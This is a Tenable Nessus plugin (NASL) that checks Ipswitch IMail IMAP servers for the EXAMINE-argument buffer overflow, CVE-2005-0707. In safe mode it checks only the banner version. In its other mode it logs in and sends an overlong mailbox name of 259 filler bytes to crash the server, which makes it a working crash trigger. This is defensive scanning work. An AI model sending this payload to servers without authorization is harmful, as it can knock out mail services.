#
# (C) Tenable Network Security
#


if (description) {
  script_id(17311);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-0707");
  script_bugtraq_id(12780);

  name["english"] = "Ipswitch IMail IMAP EXAMINE Argument Buffer Overflow Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote IMAP server is vulnerable to a buffer overflow attack.

Description :

The remote host is running a version of the Ipswitch Collaboration
Suite / Ipswitch IMail IMAP server that is prone to a buffer overflow
when processing an EXAMINE command with a long argument. 
Specifically, if an authenticated attacker sends an EXAMINE command
with a malformed mailbox name of 259 bytes or more, he will overwrite
the saved stack frame pointer and potentially gain control of process
execution. 

See also :

http://www.idefense.com/application/poi/display?id=216&type=vulnerabilities

Solution : 

Apply IMail Server 8.15 Hotfix 1 (February 3, 2005). 

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:L/Au:R/C:C/A:C/I:C/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for IMAP EXAMINE argument buffer overflow vulnerability in Ipswitch IMail";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  family["english"] = "Gain a shell remotely";
  script_family(english:family["english"]);

  script_dependencies("imap_overflow.nasl");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}

include("misc_func.inc");
include("imap_func.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);
if (get_kb_item("imap/false_imap")) exit(0);
if (get_kb_item("imap/overflow")) exit(0);
banner = get_imap_banner(port:port);
if (banner !~ '^\\* OK IMAP4 Server \\(IMail') exit(0);


if (safe_checks()) {
  if (banner =~ "IMAIL +([5-7]|8\.[01]\.|8\.1[0-4])") security_warning(port);
}
else {
  user = get_kb_item("imap/login");
  pass = get_kb_item("imap/password");
  if (!user || !pass) {
    if (log_verbosity > 1) display("imap/login and/or imap/password are empty; ", SCRIPT_NAME, " skipped!\n");
    exit(1);
  }

  # Establish a connection.
  tag = 0;
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  # Read banner.
  s = recv_line(socket:soc, length:1024);
  if (!strlen(s)) {
    close(soc);
    exit(0);
  }

  # Try to log in.
  #
  # - try LOGIN command.
  ++tag;
  c = string("a", string(tag), " LOGIN ", user, " ", pass);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = "";
  }

  # - if that didn't work, try the PLAIN SASL mechanism.
  #   nb: RFC 3501 requires this be supported by imap4rev1 servers, although
  #       it may also require SSL / TLS encapsulation.
  if (isnull(resp)) {
    ++tag;
    c = string("a", string(tag), ' AUTHENTICATE "PLAIN"');
    send(socket:soc, data:string(c, "\r\n"));
    s = recv_line(socket:soc, length:1024);
    s = chomp(s);
    if (s =~ "^\+") {
      c = base64(str:raw_string(0, user, 0, pass));
      send(socket:soc, data:string(c, "\r\n"));
      # nb: I'm not sure why, but the following recv_line often times out
      #     unless I either sleep for a bit before or specify a timeout
      #     even though the actual delay / timeout seems irrelevant.
      while (s = recv_line(socket:soc, length:1024, timeout:1)) {
        s = chomp(s);
        m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
        if (!isnull(m)) {
          resp = m[1];
          break;
        }
        resp = "";
      }
    }
  }

  # If successful, try to overflow the buffer.
  if (resp && resp =~ "OK") {
    ++tag;
    c = string("a", string(tag), ' EXAMINE ', crap(259));
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
      resp = "";
    }

    # No response; let's make sure it's really down.
    if (!s || !resp) {
      # Try to reestablish a connection and read the banner.
      soc2 = open_sock_tcp(port);
      if (soc2) s2 = recv_line(socket:soc2, length:1024);

      # If we couldn't establish the connection or read the banner,
      # there's a problem.
      if (!soc2 || !strlen(s2)) {        
        security_warning(port);
        exit(0);
      }
      close(soc2);
    }
  }

  # Logout.
  ++tag;
  c = string("a", string(tag), " LOGOUT");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = "";
  }
  close(soc);
}
